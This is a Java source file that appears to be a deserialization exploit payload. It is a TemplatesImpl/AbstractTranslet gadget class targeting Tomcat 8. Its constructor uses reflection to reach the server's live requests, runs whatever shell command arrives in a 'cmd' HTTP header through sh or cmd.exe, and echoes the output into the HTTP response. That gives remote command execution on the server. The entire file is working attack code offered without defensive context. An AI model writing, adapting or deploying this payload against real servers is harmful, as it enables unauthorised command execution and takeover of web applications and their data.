package test;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Scanner;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;

public class TemplatesImplTomcat8cmdecho extends AbstractTranslet {
    public TemplatesImplTomcat8cmdecho() throws Exception {
    	WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    	StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    	ApplicationContext applicationContext = (ApplicationContext) getFieldValue(standardContext, "context");
    	StandardService standardService = (StandardService) getFieldValue(applicationContext, "service");
    	Connector connector = standardService.findConnectors()[0];
    	ProtocolHandler protocolHandler = connector.getProtocolHandler();
    	Method getHandler = AbstractProtocol.class.getDeclaredMethod("getHandler");
    	getHandler.setAccessible(true);
    	Object object = getHandler.invoke(protocolHandler);
    	RequestGroupInfo requestGroupInfo = (RequestGroupInfo) object.getClass().getMethod("getGlobal").invoke(object);
    	ArrayList<RequestInfo> arrayList = (ArrayList) getFieldValue(requestGroupInfo, "processors");
    	boolean flag = false;
    	for (int i=0; i < arrayList.size(); i++) {
    		try {
    			RequestInfo requestInfo = arrayList.get(i);
    			org.apache.coyote.Request req = (org.apache.coyote.Request)getFieldValue(requestInfo, "req");
    			String cmd = "whoami";
    			if (req.getHeader("cmd") != null) {
    				cmd = req.getHeader("cmd");
    			}
    			boolean isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
    			String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd};
    			InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
    			Scanner s = new Scanner(in).useDelimiter("\\a");
    			String output = s.hasNext() ? s.next() : "";
    			req.getResponse().doWrite(ByteBuffer.wrap(output.getBytes("UTF-8")));
    			req.getResponse().getBytesWritten(true);
    			flag = true;
    			if (flag) {
    				break;
    			}
    			} catch(Exception e){}
    	}
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }
}
